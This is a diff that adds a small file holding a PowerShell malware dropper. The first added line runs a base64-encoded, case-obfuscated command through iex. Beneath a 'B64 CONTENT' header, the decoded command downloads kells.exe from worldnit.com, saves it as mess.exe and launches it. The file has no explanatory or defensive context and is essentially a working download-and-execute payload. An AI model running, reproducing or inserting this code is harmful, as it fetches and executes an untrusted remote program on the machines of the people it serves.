@@ -1,0 +1,7 @@
+iex([SySteM.TexT.EncOdINg]::UtF8.GEtSTring([sYstem.CoNVERt]::fROMBAse64STRiNg('CihOZXctT2JqZWN0IFN5U3RlTS5ORXQuV0VCY0xJZW50KS5ET1duTE9hREZJTEUoJ2h0dHA6Ly93b3JsZG5pdC5jb20va2VsbHMuZXhlJywnbWVzcy5leGUnKTtTdGFydC1Qcm9jZXNzICdtZXNzLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SySteM.NEt.WEBcLIent).DOWnLOaDFILE('http://worldnit.com/kells.exe','mess.exe');Start-Process 'mess.exe'
+
